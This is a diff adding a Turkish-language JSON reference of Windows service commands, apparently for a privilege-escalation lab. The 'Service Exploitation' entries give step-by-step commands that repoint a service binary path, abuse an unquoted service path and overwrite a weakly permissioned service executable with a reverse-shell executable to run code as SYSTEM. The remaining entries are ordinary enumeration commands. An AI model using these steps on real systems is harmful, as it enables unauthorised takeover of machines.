@@ -1,0 +1,138 @@
+{
+  "sc_config_service": {
+    "desc": "Servis yapılandırmasını değiştirerek farklı executable çalıştırır",
+    "category": "Service Exploitation",
+    "usage": "sc.exe config [ServiceName] binpath=\"[ExecutablePath]\"",
+    "examples": [
+      "sc.exe config svcconfig binpath=\"C:\\Users\\user\\Desktop\\reverse.exe\"",
+      "start-service svcconfig"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Servis yapılandırması değiştirilir",
+    "type": "Service Command",
+    "risk_level": "High",
+    "result": "SYSTEM yetkisi ile kod çalıştırma",
+    "security": "Yetki yükseltme tekniği"
+  },
+  "unquoted_service_path": {
+    "desc": "Tırnak işareti olmayan servis yollarını istismar eder",
+    "category": "Service Exploitation",
+    "usage": "Unquoted service path zafiyeti",
+    "examples": [
+      "Get-WmiObject win32_service | ?{$_.Name -like '*svcunquoted*'} | select Name, DisplayName, State, PathName",
+      "get-acl 'C:\\Program Files\\Unquoted Service' | ForEach-Object Access | where identityreference -eq 'BUILTIN\\Users'",
+      "cp C:\\Users\\user\\Desktop\\reverse.exe 'C:\\Program Files\\Unquoted Service\\Required.exe'",
+      "start-service svcunquoted"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Yetkisiz kod çalıştırma",
+    "type": "Service Exploit",
+    "risk_level": "High",
+    "vulnerability": "Unquoted Service Path",
+    "security": "Yazma izni olan dizinlerde executable yerleştirme"
+  },
+  "service_file_permissions": {
+    "desc": "Servis executable dosyasının güvensiz izinlerini istismar eder",
+    "category": "Service Exploitation", 
+    "usage": "Servis executable dosyasını değiştirme",
+    "examples": [
+      ".\\accesschk64.exe -ucqv svcfileperms",
+      "Get-WmiObject win32_service | ?{$_.Name -like '*svcfileperms*'} | select Name, DisplayName, State, PathName",
+      "get-acl 'C:\\Program Files\\FilePerms\\service.exe' | foreach Access",
+      "cp .\\reverse.exe 'C:\\Program Files\\FilePerms\\service.exe'",
+      "start-service svcfileperms"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Servis executable dosyası değiştirilir",
+    "type": "Service Exploit",
+    "risk_level": "High",
+    "vulnerability": "Weak File Permissions",
+    "security": "Executable dosya üzerine yazma"
+  },
+  "start_service": {
+    "desc": "Windows servisini başlatır",
+    "category": "Service Management",
+    "usage": "start-service [ServiceName]",
+    "examples": [
+      "start-service svcconfig", 
+      "start-service svcunquoted",
+      "start-service svcfileperms",
+      "start-service svcregistry"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Servis başlatılır",
+    "type": "PowerShell Cmdlet",
+    "risk_level": "Medium"
+  },
+  "get_service_info": {
+    "desc": "Servis bilgilerini detaylı şekilde getirir",
+    "category": "Service Information",
+    "usage": "Get-WmiObject win32_service | ?{$_.Name -like '*ServiceName*'} | select [Properties]",
+    "examples": [
+      "Get-WmiObject win32_service | ?{$_.Name -like '*svcunquoted*'} | select Name, DisplayName, State, PathName",
+      "Get-WmiObject win32_service | ?{$_.Name -like '*svcfileperms*'} | select Name, DisplayName, State, PathName"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Servis adı, görünen ad, durum, executable yolu",
+    "type": "PowerShell Command",
+    "risk_level": "Low"
+  },
+  "service_dependency_check": {
+    "desc": "Servis bağımlılıklarını kontrol eder",
+    "category": "Service Information",
+    "usage": "Get-Service -Name [ServiceName] -[DependencyType]",
+    "examples": [
+      "Get-Service -Name 'LanmanServer' -DependentServices",
+      "Get-Service -Name 'Tcpip' -RequiredServices"
+    ],
+    "target_os": "Windows", 
+    "requires_admin": false,
+    "output": "Servis bağımlılık bilgileri",
+    "type": "PowerShell Cmdlet",
+    "risk_level": "Low",
+    "options": {
+      "-DependentServices": "Bu servise bağımlı olan servisleri gösterir",
+      "-RequiredServices": "Bu servisin gerektirdiği servisleri gösterir"
+    }
+  },
+  "service_type_check": {
+    "desc": "Servisin türünü öğrenir",
+    "category": "Service Information",
+    "usage": "Get-Service -Name [ServiceName] | Select-Object -ExpandProperty ServiceType",
+    "examples": [
+      "Get-Service -Name 'svcregistry' | Select-Object -ExpandProperty ServiceType"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Servis türü (Win32OwnProcess, Win32ShareProcess, etc.)",
+    "type": "PowerShell Cmdlet",
+    "risk_level": "Low",
+    "related_registry": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\[ServiceName]"
+  },
+  "accesschk_service_permissions": {
+    "desc": "Servis izinlerini kontrol eder",
+    "category": "Service Security",
+    "usage": ".\\accesschk64.exe -ucqv [ServiceName] /accepteula",
+    "examples": [
+      ".\\accesschk64.exe -ucqv svcfileperms",
+      ".\\accesschk64.exe -uwcqv user *"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Servis kontrol izinleri",
+    "type": "Security Tool",
+    "risk_level": "Medium",
+    "tool": "Sysinternals AccessChk",
+    "parameters": {
+      "-u": "Kullanıcı hakları",
+      "-c": "Servis kontrol hakları", 
+      "-q": "Sessiz mod",
+      "-v": "Detaylı çıktı"
+    }
+  }
+}
